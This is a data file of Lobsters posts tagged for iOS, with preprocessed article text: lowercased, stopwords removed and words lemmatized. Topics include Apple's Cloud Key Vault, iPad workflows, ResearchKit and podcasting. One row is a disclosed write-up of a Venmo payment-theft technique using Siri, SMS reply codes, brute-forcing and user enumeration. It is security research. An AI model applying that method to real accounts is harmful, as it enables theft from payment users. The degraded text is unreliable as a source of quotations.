foundation maintained telenav work sole benefit improving openstreetmap
365,Lobsters,ios,Apple iOS,"Apple at BlackHat: Reopening the ""Going Dark"" Debate",https://lawfareblog.com/apple-blackhat-reopening-going-dark-debate,apple blackhat reopening going dark debate,gave talk io keychain icloud keychain,week ago blackhat hacker convention la vega ivan krstiƒá head security engineering architecture apple gave talk entitled behind scene io security slide available historic talk couple reason first apple traditionally secretive technically security device apple also announced first bug bounty program far newsworthy something else happened talk unbeknownst presenter anybody audience apple reopened going dark dispute fbi privacy community turned entire dispute head cold light day suspect apple u government privacy activist going rather unhappy digest sobering implication talk though likely upset entirely different reason short apple built thing privacy community saying year reckless dangerous impossible highvalue encryption key secured vault key stolen misused hacker malicious insider without hint selfawareness apple head security engineering architecture went way blackhat la vega boast getting ahead let start beginning breath krstiƒá talk fantastically wide talked technically making iphone browser resilient zero day vulnerability apple new bug bounty program technical detail iphone us secure enclave processor defend lawenforcement repeatedly guessing pin break iphones design sharing saved password iphone mac apple intercept followed applevsfbisanbernardinoallwritsact case february may remember side discussion medium secure enclave processor tiny processor modern iphones cryptographically involved turning user pin code device encryption key unlock data iphone defend bruteforce repeatedly guessing pin code right one secure enclave maintains little counter number failed guess ten failed attempt permanently lock device forever destroying possibility decrypting user data another part talk really caught remark hidden slide icloud keychain backup rather technical need bit background let try explain apple long time iphone feature called io keychain feature let apps iphone browser remember saved website password credit card recently apple extended feature icloud keychain automatically synchronizing saved password mac computer order avoid uploading password icloud directly subpoenaable form apple first encrypts icloud security code practice almost always device pin code proceeds upload encrypted form icloud subtle problem setup apple needed solve normally fbi really hard time getting iphones secure enclave let try password really slowly even ten time user data becomes permanently inaccessible unless apple careful fbi would able something clever subpoenaed encrypted keychain file face thing file interesting lawenforcement encrypted user pin code fbi know user pin code fbi something file user device guess pin code time apple represents problem one resolved fix two slide later presentation apple solution cloud key vault calling cloud key vault complicated something understatement conceptually enormous secure enclave entire icloud datacenter normally iphone pin guess handled secure enclave processor secure enclave ensures ten failed guess permanently locked phone cloud key vault thing much larger scale cloud key vault manages pin guess uploaded encrypted file cloud key vault ensures ten failed pin guess data encrypted keychain file becomes permanently inaccessible fundamental purpose cloud key vault prevent apple employee hacker somehow hack datacenter employee compelled court order circumventing pin guess limit trying force open uploaded keychain file iphone synchronizes saved password user mac however two way cheat system apple thought first attacker could get ahold master encryption key hidden inside cloud key vault key fbi would able try pin guess without asking cloud key vault thus without limitation able guess pin ten time second way would replace upload new code cloud key vault instruct reset disable counter specific file fbi bruteforces pin apple defense attack ingenious company destroys access card device destroyed cloud key vault operates entirely autonomously according code written time started apple employee administrative access device reach take master encryption key reach reset failed pinguess counter file even upload new code device attempt would lead inevitably destruction masterkey thereby causing cryptographic selfdestruction uploaded keychain file devious defense robust design smart work built objectively work scale face secure hacker malicious insider courtorders thing apple intention building cloud key vault thwart pesky lawenforcement officer brandishing courtorders system represents big problem privacy community ongoing dispute fbi going dark debate compelling technical argument going dark technical frontdoor design technology community simply know securely store highvalue encryption key used stolen misused hacker malicious insider moreover many privacy advocate assert technical design look ok paper probably fall apart deployed scale practice apple blew argument water apple cloud key vault solves problem exactly building system even apple employee access compelled courtorder apple ironically seemingly inadvertently built system keep master encryption key sealed special vault technically prevents key stolen misused hacker malicious insider apple apple unintentional broadside privacy community best going dark argument way cloud key vault turn going dark dispute head cloud key vault also something sits unusual going dark nonadministrable sits uncomfortably way going dark debate presented public reason autonomous nonadministrable code nothing encryption past year much public discourse going dark rather craftily conflated going dark strong encryption clever framing error one lawenforcement never effectively rebutted error example data erasure involve encryption yet pose problem lawenforcement conversely http bank us strong encryption prevent lawenforcement investigating financial crime happen commit using bank website rather going dark much le strong encryption specific system design prevent lawenforcement gaining access information court order device encryption endtoend communication work deploying encryption configuration provider never see user content key going dark problem much le sophisticated involve encryption example simply choosing record relevant transaction log website thwart attempt lawenforcement obtain content would otherwise log autonomous nonadministrable code another example nonencryption category going dark problem apple inability help lawenforcement reset pinguessing counter exists counter intentionally inaccessible outside cloud key vault design nobody apple administer upload new code cloud key vault computer reset meaningfully new category problem normally going dark problem boil sorry content sorry key variant something else sorry data computer intentionally locked computer category raise lot new question technology company autonomous nonadministrable code raise lot opportunity hold process data way hacked example technology company could use autonomous nonadministrable code scan user content advertising keywords without ever exposing usercontent application developer malicious insider someone hack server lawyer question secure enclave interact order writ act much burden undue burden come compelling apple disarm cryptographic selfdestruct cloud key vault design like u government many new question new category going dark raise start become widely adopted cloud provider context particular possibility company might able hold process user data without company staff hacker lawenforcement officer courtorders able gain access data hold potential seismically shift lawenforcement ability obtain data cloud provider suspect apple head security engineering architecture stood go stage blackhat none going head team built several cool idea securing apple device hacker overseen construction ingenious design keep fbi icloud file make news announcing apple first ever bug bounty program little know also turn much know going dark head reopen pandora box
366,Lobsters,ios,Apple iOS,Behind the Scenes with iOS Security,https://www.blackhat.com/docs/us-16/materials/us-16-Krstic.pdf,behind scene io security,,obj length r filter flatedecode stream x l
367,Lobsters,ios,Apple iOS,"How to steal $2,999.99 in less than 2 minutes with Venmo and Siri",http://www.martinvigo.com/steal-2999-99-minute-venmo-siri/,steal le minute venmo siri,venmo venmo notification sm gave option reply code order make payment stealing money locked device weekly limit use siri send sm device locked text message preview allows see lock screen sent text part content venmo sm notification venmo sm notification enabled default activate sm notification service sending sm word start short code number owned venmo venmo patch workaround use siri read latest text demo preventing attack disable sm preview disable siri lock screen possible attack payment canceled simply time based protection code linked payment request every charge request associated new code without invalidating previous request one request multiple victim user enumeration instead sending million request one victim send one request million venmo user twilio monitored short code number spoofed managed get text instead shortcode rate limiting make user enumeration expensive venmo simply return message whether phone number valid daily rate limit number charge request user limited number charge request per day responsible disclosure killed sm replytopay functionality real number used anymore typo sm fixed timeline,venmo popular mobile app simplifies payment among friend link bank account credit card start sending money others instantly venmo limited make payment allows charge others well say friend cash tasty burrito paid option proactive charge friend using venmo charging someone mean money withdraw account mean get notification see pending payment account friend accept charge order payment happen functionality going take advantage venmo notification mobile app venmo notification system keep date charge payment etc default notification processed rendered app every time something relevant happens see familiar alert popup mobile device screen time ago friend charged bottle gin bought partying hate invasive notification disabled however instead classic app notification got sm never notice immediately thought new feature venmo looking realized notification call action sm gave option reply code order make payment expected payment processed thinking authenticated venmo order make payment simply replied text code given seemed sketchy stealing money locked device mentioned one thing venmo send payment request someone simple paying somebody instead clicking pay click charge weekly limit hence title post remembered use siri send sm device locked worth noting feature default became especially popular hey siri feature added io know send sm locked device need code present sm order reply make payment apple introduced text message preview allows see lock screen sent text part content also default combine two able see sm code reply using siri without unlocking device box win venmo sm notification reproduced attack phone excited running report venmo wanted make sure working device tested girlfriend iphone surprise get sm ruined everything order attack significant looking make happen device default configuration yes could see text lock screen yes could reply text using siri venmo sm notification enabled default must enabled point past really wanted make possible default setting looked everything checking sm service started reply random character resulted another sm reply like one sm reply random data read sm realized pay attention important part reply stop cancel reply stop cancel sm notification service send text word start activate sm activate service bingo activate sm notification service sending sm word start short code number owned venmo used sm notification able activate venmo sm notification service see secret code reply make payment without unlocking device venmo patch workaround sm preview reported venmo together finding read decided fix particular issue adding additional space sm contains digit code text preview feature show limited number character venmo added enough space sm prevent code displayed lock screen preview unfortunately fix good enough found really easy workaround could still find code use siri read latest text could read anymore lock screen siri read simple effective demo preventing attack several issue honest venmo fault problem pay replying sm problem also see text reply without unlocking device apple venmo also let enable service sm possible venmo remove functionality prevent attack entirely unless already enabled given disabling venmo sm notification effective disable sm preview also disable siri lock screen one send text behalf possible attack know abuse sm notification system make money wanted explore possibility service still need physical access mobile device order perform attack wanted see could thing without see sm basically bruteforcing code charged account receive sm started input incorrect code expecting number try payment canceled instead got sm informing exceeded number try would wait bit try interesting payment canceled simply time based protection place make bruteforcing difficult wrong code sm noticed one requested money confirmation code venmo told security impact typo anyway point try wait minute till could try another time code six digit long million possibility try code every minute math possible feasible code linked payment request since bruteforce entire code space tried send charge request instead one basically wanted see send second charge request first one invalidated together code turn case every charge request associated new code without invalidating previous request mean instead sending one request bruteforcing million code send multiple charge request reduce number code guess used burp look api indeed able send payment request matter second course noisy remember victim get one notification every charge need improve one request multiple victim previous approach send multiple request victim order reduce number code guess since noisy send one request multiple people instead user enumeration make finding victim simple take line code write script return million valid venmo user emailsphone number user enumeration venmo instead sending million request one victim send one request million venmo user send text venmo service code million user statistically least one match forget spoof phone number victim sending sm trivially easy service like twilio though attack theoretical try venmo payment known monitored last thing want someone knocking door asking many people owes money reported venmo responded possible three reason short code number spoofed venmo told possible spoof sm message short code since bypass sm gateway spoofing would need occur find either prevents attack entirely started thinking short code number must associated real number find real number could perform attack explained would able spoof sender test setting venmo web managed get text instead shortcode awesome also confirmed get charge notification shortcode number reply digit code real number payment still happen making attack possible rate limiting make user enumeration expensive venmo think possible enumerate account massively since rate limiting place prevent abuse endpoint problem unauthenticated call try recover password log mean way rate limit check ip multiple request coming easily bypass protection using list proxy iterate ip change every request without much performance impact need max million valid account venmo simply return message whether phone number valid daily rate limit number charge request venmo claim user limited number charge request per day would prevent attack scenario scaling point would significantly improve chance brute forcing reality make attack tedious rather impossible charge request limit applied per user basis possible create multiple venmo account switch every time request limit reached test indicate make charge request per day average would need account successfully perform attack also need valid phone number create account make trickier responsible disclosure mentioned disclosed finding venmo responsibly accepted issue found proposed patch mentioned assumption incorrect explained workarounds found already shared venmo well back forth venmo took following step secure app killed sm replytopay functionality good way fix glad venmo decided kill feature v keeping knowing flaw real number used anymore receive sm shortcode number reply real number typo sm fixed communication venmo security team smooth professional kept updated fix pushed production generally good experience timeline june disclosure venmo june venmo acknowledges issue discard others june question patch assumption made venmo june venmo agrees decides kill replytopay feature july venmo notifies fix deployed
368,Lobsters,ios,Apple iOS,iPad-only is the new desktop Linux,https://medium.com/@chipotlecoyote/ipad-only-is-the-new-desktop-linux-de88b61b6d99,ipadonly new desktop linux,ipadonly new desktop linux like ipad simple using ipad primary computer may like challenge skeptical magic keyboard matias mini tactile pro waterfield slip case tom bihn caf√© bag scrivo pro scrivener io criticmarkup keyboard maestro argued year later responded addendum january,ipadonly new desktop linuxyou like ipad simple using ipad primary computer may like challenge nb linux user write angry response please read addendum end okay okay earlier year moved macbook pro imac reason mostly wanted display even middleaged glasseswearing eye tell difference also lot writing desk dropbox icloud syncing document two machine become nearly transparentbut still travel occasionally day trip frequently ipad skeptical lot folk tech circle least adjacent love using ipad pro main mobile device primary computer abandoned rather outdated ipad miniso got ipad pro imac come magic keyboard using like mechanical keyboard kept using new imac record settled matias mini tactile pro decided use getting waterfield slip case tom bihn caf√© bag whole shebangand started using iti used make revision story send editor used create new story used editing bigger work scrivo pro scrivener ipad official scrivener io release even used working copy check company documentation git made change editorial textastic merged back switched spark email client ulysses plain text editori month using daily using relatively serious work yes like yes replace macbook many regard need easier ipad either imac macbook email triage instance anything involves longform reading good single focus editor writingbut fell continue falling even io needed anything involves one program onceright gotten ipad pro something common fiction writer review comment editor short story mine accept reject change make copy edits send file back reply original messageunless writing hip online publication get editor comment criticmarkup markdown document get word open file word another program transparently roundtrip comment revision tracking mac save attachment desktop doubleclick open page make change reply original message drag attachment desktopon ipad everything happens context app must open attachment email program use open send page make change send back spark email program page new message editor email address saved contact switch back message replying save draft guess use dropbox desktop go back page send copy dropbox replyeven best case scenario mac speed blow io away cpu power io design handle task like gracefully possible would faster using different set apps one aware deeper fashion mac could used email program word processor handled word revision tracking followed stepsthe io conceptual model everything life app want play game read web page even read book fine might want work scrivener document never want work bbedit document want work markdown document mac moving editor trivial want work file byword editorial ipad though updating individual local copy file based shared access copy cloud storage provider file byword icloud move editorial icloud file dropbox editorial byword link different directory change setting one bothyou argue stay within bound ecosystem supposed fuck plain text lot file work de facto standard jpeg word html downloading image web site resizing editing image editor uploading wordpress thing people time require coordination multiple apps yet demand specific appsif going tell normal people task please quilters run blog salesperson create presentation nontechie writer send revision editor u nerd insist io solves problem normal people understand file system putting file desktop desktop act shared document storage something turn normal people sometimes need io solve problem lecture virtue container want world use dropbox temporary storage medium step forward workflow sighconceptually like workflow fantastic stuff kind like keyboard maestro mac much km workflow know people think workflow much easier understand km automator barely make head tail workflow ui workflow added ball chain switching apps io compared mac positively glacialbut workflow essential tool io power user thrill figuring get relatively complex task done right realizing led comparison going raise hackle isusing io primary o like using desktop linuxno hear see linux user care much easier say nonlinux world sure say open access free scotch ale yadda yadda yadda really like challenge figuring used mac window pc part alluredon deny folk prefer ipad mac pc like challenge awesome check edit file company github repo make pull request ipad myke hurley made observation analog ue podcast even could prove given task easier mac still rather ipad fun absolutely get thatyet irony u especially u older became mac user tired figure get work done push come shove comfortable using ipad pro replace macbook pro still imacsteve job famously compared mac pc truck tablet car argued year later desktop computer truck laptop car tablet motorcycle john gruber responded maybe say give decade slow steady incremental improvement postpc device software decade people gradually adjust computing habit think probably true another seven year go today think oneport macbook make much deliberate statement use ipad maybe change time soon yes remember phil schiller description ipad pro ultimate pc replacement perhaps replace laptop many people like ford still make trucksnow time wrap get back fiction planning wait good excuse use real scrivener ipadthere great response pro con great one medium benjamin brook indeed us ipad primary computeraddendum january flattered piece still garner read confess certain level irritation linux user react hit piece get piece ipad linux right literally one paragraph linux apparently one phrase keep burning people bun suggesting run linux desktop go ipadonly like challenge omg watt dude think linux difficult use must never used modern linux idea talking outrage fact used modern linux distribution desktop server also run freebsd although experience quite date yes get longer edit modelines installing configuring linux like twenty year ago challenge go outside mainstream forced thing new software new ux paradigm depending need difference make task difficult may make task difficult people okay okayand sure people find linux way easier use possible respect window macos pretty sure heard sorry made angry io change thing ipadonly crowd might future article
369,Lobsters,ios,Apple iOS,Update your Apple devices now to fix a terrifying security bug,http://qz.com/738214/update-your-apple-devices-now-to-fix-a-terrifying-security-bug/,update apple device fix terrifying security bug,discovered tyler bohan report finding io el capitan point according one estimate billion active device worldwide stagefright,gaping security hole apple operating system exploited default messaging web browsing email software instance hacker could grab password sending infected need phone numberthe security gap discovered tyler bohan researcher cisco talos unit cisco work security forbes first report finding hack strike heart apple mobile desktop operating system exploiting way deal importing exporting imageshere attack work hacker creates malware formatted tiff file another image format like jpg gif hacker sends target using imessage especially effective messaging app automatically render image default settingsonce infected file received malicious code executed target device giving attacker access device memory stored password victim even chance prevent attack delivered email making user visit website contains infected image using apple safari browserit get worse bohan found security hole present version io o x except latest one published july bohan shared discovery apple ahead time latest version o address vulnerability mean safe version io o x el capitan another quick fix security research firm sophos point turn imessage iphone also disable mm messaging mean limited receiving text message image file receivedthe scale vulnerability staggering according apple io device run io earlier million active io device according one estimate mean least million device running apple mobile operating system vulnerable hack even accounting mobile device running absolutely newest version io mac date apple said billion active device worldwide break figure detailthis apple security problem likened flaw android google mobile operating system called stagefright discovered last year security hole also relied texting infected image million android device exposed discovered researcher zimperium zlabs april shared finding google issued update fixing problem
370,Lobsters,ios,Apple iOS,iOS 10 Preview,http://arstechnica.com/apple/2016/07/48-hours-with-ios-10s-first-public-beta-build/,io preview,enlarge table content,enlarge io beta ipad pro iphone cunningham spent last six month buying house need forgive house house metaphor brain found helpful trying nail io imagine io fundamentally solid house need major remodeling io largely cosmetic update putting new siding maybe nice brick fa√ßade giving room nice paint job io underthehood change roughly equivalent replacing wiring harder see make big difference everyday usage io gave extensive makeover one particular room let call ipad basically fine used fullest potential context overextended metaphor io best thought effort redo multiple room house knocking figurative wall removing metaphorical ugly dropped ceiling first time apple making notable change way basic thing like lock screen notification center siri look work couple day play second developer build io apple tell u moreorless identical public beta released today short turnaround time mean couple major area operating photo map news probably glossed favor spending time area evaluating feature depend thirdparty app support need wait apps ready finally lot outlined subject change time final golden master build issued fall able go depth final review couple month table content listing image apple
372,Lobsters,ios,Apple iOS,"""How to turn off the shutter sound?"" (Dec 2010)",http://stackoverflow.com/questions/4401232/avfoundation-how-to-turn-off-the-shutter-sound-when-capturestillimageasynchrono,turn shutter sound dec,method http method grab frame video stream method,method sure work try playing blank audio file right send capture event play clip add audio toolbox framework include audiotoolboxaudiotoolboxh play audio file like immediately take picture nsstring path nsbundle mainbundle pathforresource blank oftype wav systemsoundid soundid nsurl filepath nsurl fileurlwithpath path isdirectory audioservicescreatesystemsoundid cfurlref filepath soundid audioservicesplaysystemsound soundid blank audio file need http method also alternative nt work long nt need good resolution grab frame video stream thus avoiding picture sound altogether method another way would take screenshot application way uigraphicsbeginimagecontext selfwindowboundssize selfwindowlayer renderincontext uigraphicsgetcurrentcontext uiimage image uigraphicsgetimagefromcurrentimagecontext uigraphicsendimagecontext nsdata data uiimagepngrepresentation image data writetofile foopng atomically yes wanting fill whole screen preview video stream screenshot look good avcapturesession capturesession yourcapturesession avcapturevideopreviewlayer previewlayer avcapturevideopreviewlayer layerwithsession capturesession uiview aview theviewyouwantthelayerin previewlayerframe aviewbounds assume want preview layer fill view aviewlayer addsublayer previewlayer
373,Lobsters,ios,Apple iOS,Apple confirms iOS kernel code left unencrypted intentionally,https://techcrunch.com/2016/06/22/apple-unencrypted-kernel/,apple confirms io kernel code left unencrypted intentionally,apple confirms io kernel code left unencrypted intentionally apple mit technology review open letter dropped request,apple confirms io kernel code left unencrypted intentionally apple released preview version io annual developer conference last week company slipped surprise security researcher left core operating system kernel unencrypted kernel cache contain user info unencrypting able optimize operating system performance without compromising security apple spokesperson told techcrunch apple kept inner working kernel obfuscated encryption previous version io leaving developer researcher dark kernel manages security limit way application iphone ipad access hardware device making crucial part operating system although encryption often thought synonymous security lack encryption case mean device running io le secure mean researcher developer poke around kernel code first time security flaw come light quickly flaw revealed quickly patched leaving kernel unencrypted rare move transparency apple company notoriously secretive product security expert speculated mit technology review lack encryption kernel accidental mistake would shocking practically unbelievable researcher said would incredibly glaring oversight like forgetting put door elevator io security expert jonathan zdziarski told mit technology review apple begun shift towards greater transparency particularly security issue wake battle fbi unlocking iphone used san bernardino shooter fbi attempted compel apple unlock phone ceo tim cook penned rare open letter apple customer explaining decision resist feel must speak face see overreach u government cook wrote fbi eventually dropped request paying third party break device opening kernel code inspection could weaken market security flaw like one fbi presumed used get san bernardino iphone flaw revealed quickly widely reduce price law enforcement black market pay could mean quicker fix apple customer
375,Lobsters,ios,Apple iOS,WWDC 2016,http://www.apple.com/apple-events/june-2016/,wwdc,apple special event,apple special event june announcing upgraded operating system iphone ipad mac apple watch apple tv
377,Lobsters,ios,Apple iOS,Researching ResearchKit,http://petersteinberger.com/blog/2015/researching-researchkit/,researching researchkit,githubreleased open source project firstresponder like iterating view using weak variable uiapplication sendaction solution also us sendaction much like appkit rdar private api dynamic cast language feature swift built language dynamic type dynamic type io le two month away io radar workarounds openradar interface builder overriding creating pdf html pspdfkit pdf framework io android exact technique orkhtmlpdfwriter researchkit nullability swift internalprivate web view nssecurecoding set macro accessibility macro sample usage version check went ahead wrote pull request fix test unit test tinted animation set video custom shaders final note onslaught pull request follow twitter even update hiring,apple first githubreleased open source project big thing much learn spent time reading source observation firstresponder uikit unlike appkit mac currently public way detect first responder several clever le clever workarounds like iterating view using weak variable uiapplication sendaction course apple hit issue researchkit well solution also us sendaction feel like official firstresponder method much like appkit please help file radar dupe mine rdar wonder course method exists private api dynamic cast apple us nifty macro ensure class expected type define orkdynamiccast x c c x iskindofclass c class x nil language feature swift c whole variety cast operator built language love see actual language support objectivec well dynamic type apple added dynamic type io give user control large text apps le two month away io yet many apps still ignore almost app properly reacts changing setting runtime system sends uicontentsizecategorydidchangenotification however easy way rebuild ui different font apple way solving subclassing common view class like uilabel orklabel fetch new font invalidates intrinsic content size trigger new auto layout pas similar patter orkanswertextfieldview orktableviewcell orktextbutton pattern however make hard set custom font size one could extend class accept font text style like uifonttextstyleheadline make flexible apple instead us subclass like orktapcountlabel customize font size radar workarounds apple initial release two radar referenced work around auto layout issue work around issue tinting animated image course detailed entry openradar easy read least workarounds marked interesting radar priority interface builder view created code apple us storyboard example catalog apple us standard pattern overriding viewdidload build ui combination auto layout visual format language whenever possible creating pdf html particularly interesting since main job working pspdfkit pdf framework io android code allows converting html pdf via ab using uiwebview printing subsystem marked experimental impression intended usage likely work accident however apple using exact technique orkhtmlpdfwriter researchkit seems acceptable way converting html document nullability really great see every class fully annotated nsassumenonnullbeginend make usage much nicer especially swift also great documentation general time annotate class well swift since researchkit objectivec sure started swift already post time reason example catalog completely swift objectivec great choice framework decide selectively method public one private swift currently yet possible update access control actually swift since reason went objectivec maybe still immature tooling sourcekit crash internalprivate clear pattern apple us internal private private class extension however great see try keep api small expose necessary part web view large text like consent review language displayed view controller embed web view based uiwebview far wkwebview used regular text perfectly ok probably even preferred since lot simpler use spin separate process hand apple consistently us uialertcontroller reference legacy uialertviewuiactionsheet apis anymore nssecurecoding great see apple adopting secure coding everywhere using set macro make code le repetitive overall nothing special accessibility bunch interesting detail apple approach accessibility support notable orkaccessibilitystringforvariables macro allows string concatenation ignoring empty nil string sample usage version check researchkit contains check io healthkit really work release however instead checking foundation version fast using new isoperatingsystematleastversion method nsprocessinfo converting version float compare worst way version checking went ahead wrote pull request fix see get merged test yes unit test use host application purely modeltests love see viewintegration test well start tinted animation wondering apple pulled nifty animation expecting advanced path animation code disappoint set video however lot coordinated orkvisualconsenttransitionanimator powered orkeaglmovieplayerview complete custom shaders lot code tint video fly final note overall researchkit well done could critizise naming inconsistency indentation spacing overall structure good excited much better get apple start merging onslaught pull request writing framework certainly challenge many shortcut one writing apps apply follow twitter even update oh would love work framework fulltime hiring
379,Lobsters,ios,Apple iOS,Apple‚Äôs actual role in podcasting: be careful what you wish for,https://marco.org/2016/05/07/apple-role-in-podcasting,apple actual role podcasting careful wish,new york time article biggest player app biggest podcast directory distribution promotion rate new subscription playback better apps like mine misguided new york time article big podcasters asking software illinformed new york time article never adding tracking overcast trust podcasters want,new york time article get lot wrong podcast listener podcast producer clear apple actual role podcasting today exactly big producer asking podcasts work nothing like app store better making sure never head road podcasts still work like oldschool blog podcast hosted anywhere completely owned controlled producer podcastplayer apps periodically check subscribed podcast r feed new episode published fetch audio file directly producer site host monetization analytics completely podcasters podcasts custom listening apps provide creator data monetization opportunity completely decentralized free fair open uncontrollable single entity long ecosystem podcastplayer apps remains diverse enough app dictate arbitrary term publisher way facebook effectively control web publishing industry apple hold two large role podcasting today threaten health yet biggest player app apple builtin io podcasts app biggest podcast player world wide margin holding roughly marketshare biggest podcast directory itunes store podcasts directory one matter listed essential podcasts easily found searching apps critically despite large role apple never locked player dictated almost term inserted intermediary beyond directory stage like itunes store podcast functionality almost completely unchanged since introduction decade ago unlike rest store better stay way distribution apple directory give podcast player direct r feed podcasts found player fetch directly publisher feed point forward apple longer party activity search unless using apple player app nothing stopping anyone else making directory good podcast player let user bypass directory subscribe podcast world pasting url promotion apple editorial feature unparalleled industry know anyone applies human curation podcasts apple algorithmic top chart far podcasters able piece together based primarily solely rate new subscription podcast apple podcasts io itunes mac subscription happening apps effect apple promotional chart long remains decentralized open apple way knowing playback apple podcasts app io fine great leaving door wide open better apps like mine seriously much better free trying succeed app store neither time place modesty apple app integration privilege thirdparty apps match everdecreasing relevance locked player market let get back misguided new york time article big podcasters asking ignoring moment podcasters news article usually mean handful largest producer friend two reporter press release midroll collectively believe represent podcasters despite massmarket tip iceberg cbs represented television business insider represented blogging article exception podcasters asking tool web publisher used abused death last decade systematically ruin web content nearly everywhere data web getting data easy web page software letting publisher use javascript run code right player app web browser creepily record analyze every move made selling effectively advertiser letting algorithmically tailor content maximize penny cost quality ethic podcasts podcast player player platform execute arbitrary code publisher publisher see ip address downloading give rough idea audience size approximate location apps use know exactly whether searched new refrigerator yesterday whether listened ad podcasts even whether listened downloading big publisher think barbaric think beautiful big publisher think holding back medium think protects medium illinformed new york time article correct broad stroke big given much got wrong apple role podcasting big podcasters want apple add behavioral data creepy tracking apple podcasts app share data hold breath way often get pitched garbage podcastlisteningbehavioraldata integration never adding tracking overcast never biggest reason made free massmarket podcast app could take stand like big podcasters also apparently want apple insert financial intermediary allow payment podcasts within apple app seen go trust podcasters want would add rule restriction delay big commission would increase apple dominant role podcasts push diversity give apple far control potentially destroy one web last open medium ecosystem podcasting growing steadily decade extends far beyond top handful publicradio show need everyone need represent everyone many podcasters would consider goal advancement medium apple ever used dominant position benevolently benignly far medium diversified apple role shrunk last thing podcasters need apple increase role dominance last thing need data economy destroy another medium
380,Lobsters,ios,Apple iOS,My Tablet Has Stickers,https://medium.learningbyshipping.com/my-tablet-has-stickers-8f7ab9022ebd,tablet sticker,continuous productivity mobile o paradigm debate lack bootstrapping june shift free brain reveal code everything considered weird hard awkward thing seem easy really crazy think problem solved old way ok thing annoying commandtab list short apps always io apis implemented copypaste http aspx screenshots cloud storage fragmentation keyboard handling ok thing much easier flow social apps flow weight connectivity instant onoff second screen different apps like two devicessecond screen window management futzing presentation photo worry local file ever universal charging next stevesi,tablet sticker room spare also several keyboard waiting perfect one photo authorwhen received new ipad pro decided break tablet tradition personalize sticker done laptop surface year began mindset ipad would replace laptop full time use laptop mean surface yoga macbook desktop almost month exactly happened sticker investment paid feel like forcing mode working rather productive futz way le computer find many thing easier work different betteryou listen benedictevans discus strategic implication shift latest podcast finally tablet replaces laptop post adapting change thing learned along wayunlike many use product month test experiment deeply held belief rise smartphones specifically starting iphone launched would profound impact way use computer transformation span hardware thinner lighter smaller cheaper longer battery life instant onoff touch sensor connectivity etc operating system secure reliable maintainable robust etc app software refactored renewed reimagined etc combination attribute however causing change fundamental leap mainframe workstation characterbased graphical o desktop laptop clientserver web perhaps equal rolled one shift reason whole planet involvednote mac v window io v android discussion snickering please shift modern mobile computing platform hardware software cultural change surround two post provide context long making continuous productivity mobile o paradigmthe debateevery single time discussion come moving laptopdesktop mean window mac tablet mean one running mobile o android io least several visceral reaction assertion tablet medium consumption lightweight socialefficiency requires keyboard mouse multiple monitor customizations utility exist tabletswork requires software tool tcan exist tablethaving debated year time win anyone allow share perspective also discussed podcast detailed post referenced far away used productivity tool email like reality day email first seen often acted smartphone without even venturing tablet must agree one productive without laptop even tiny screen attachment viewed opinion formed project approved smartphones tablet make even easier adding keyboard bigger screen beyond email next used productivity tool browser hold tablet full browser fully capable renderinginvariably debating tablet v laptop issue start keyboard mouse many forget time mouse even introduction mouse talked lack precision compared absolute rowcolumn keyboard positioning software drawing program example work value work product relying tool changed keyboard surprise found home tablet term utility extension many lack analog tablet many irrelevant arguably part represent point historic personal preference particular much world managing file local storage device tablet thingsif developer developerlike professional going use tablet yet ok need try spoil rest u geez window office compiled xenix gik machine first year recognize special place computer scientist place bootstrapping system huge day could compile m c compiler development look spreadsheet writing vba creating pivottables exec tablet yet post people use laptop way know many many people good idea debate center developer scenario since vast majority people thing especially one considers degree many earth experience smartphone first computer crux time platform shift two type people people embrace shift perhaps enthusiasm fandom maybe know better people know better see challenge changing use challenge anchor criticismwhile optimistic change realistic pace change really permeate broad range people organization culture use case fact change take time cause u know limitation something new dig heel importantly maker definition get ahead change soon find behindchange difficult disruptive scary talk gone quite shift learned two thingsfirst tend embrace shift sooner suspend reality sooner sometimes mean ultimately go backwards undo change since shift really pan speed evolution worth change eventually happen even false start newton tabletpc second time time industry find prefer fixate obstacle seeing one aspect change rather one change cause many thing change reaction new normal felt web would never work dialup slow predict rise low cost broadly deployed home broadband people like said one could ever communicate sm consider would collectively develop new way communicating different email word way think technology really center system rather constellation body influence otherin one amazing steve job interview walt mossberg kara swisher june asked tablet replacing laptop job said functionality gap software respectfully partially right better software needed part shift accompanying broad range change take place doubt change happening consider much work lifeprocessculture changed introduction smartphones tablet took longer additive substitute change like email took two decade become something resembling universal tool even around yearsas difficult often overestimate platform shift short term underestimate long termthe shiftplatform shift difficultas difficult often overestimate platform shift short term underestimate long termby far biggest obstacle change people job job boss coworkers customer others little empathy work happening busy unable something committed way someone wanted itbenedict talk weekly status report universal tool large corporation someone crunch number gather update follow ups compress deck elaborate status mail sent cob friday late sunday night people work get vote work done remains fixture companythen one day intern new hire show know better boom status web page everyone us saas product live data dashboard tool change whole process deliverable different change happens even conservative company personal note one weekend came moved specification office itmaintained smb file share web server running desk easy part hard part change especially personally need change requires rewire brain change way thing real hard get uncomfortable defensiveat heart matter change easiest generational change easier ride change keep always done whether new programming language new paradigm like cloud mobile one almost always find rich rewarding avoid change embrace change adopt changeoriented mindset watched many consultant developer stick clientserver wait web simply plenty work maintaining enhancing system put place irony keep mind system came one point clientserver consultant renegade displacing mainframe system see go changeoriented mindset especially technology one force let go model developed thing work learn new approach rewiring letting go muscle memory pattern often took year develop perfect incredibly difficult technical sense also difficult emotionally much sense empowerment come mastery tool use changing replacing tool mean longer master back equal footing lot people one like resetting station tech hierarchythat feeling disempowerment result much emotional reaction major change great example transition silverhalide film digital best photographer jumped technical argument quality digital image call technical buzzsaw new technology approach dismantled expert specific often provable limitation short time digital got better moore law digital camera professional invented even importantly whole workflow modern photography changed sport fashion news revolutionized digital film could even compete even line resolution color fidelity felt better whole new generation pro expert sprung overnight creating image expert silver could even imagine joined photography digital probably look film absurdly prehistoric change technology happensmy four way cope change free brain learn new way something without judging people learned wordperfect mastered reveal code used graphical word processor saw much easier thing could wysiwyg let favorite example always person wordperfect document bug like incorrect indent font change debugged looking code finding mismatch showing select text directly format see real breakthrough even though many continued say preferred use reveal codeseverything considered weird hard awkward know something one way shown totally different way often scramble brain fact every new way something look difficult know people forget arbitrary way thing first place much design effort always remember someone started idea honed within constraint time first computer tool editing general model select wanted bold delete choose text apply mouse people decided selecting text highlighting first choosing verb would better hard see could evolved reverse difficulty allthings seem easy really crazy think difficult debate center around flow get used yet hindsight seem literally crazy favorite one solving problem drag drop obscured target window know drag something traytask bar hold icon get visual indication ok going highlight window magically obscured window pop drag putting aside physical dexterity required craziness solution arose model drag drop could reconciled model overlapping window almost one know trick boy people feel essentialmost problem solved old way important thing keep mind switch new way thing lot flow accomplished remarkably difficult seem like fighting system whole time case best thing step back realize maybe need anymore even better 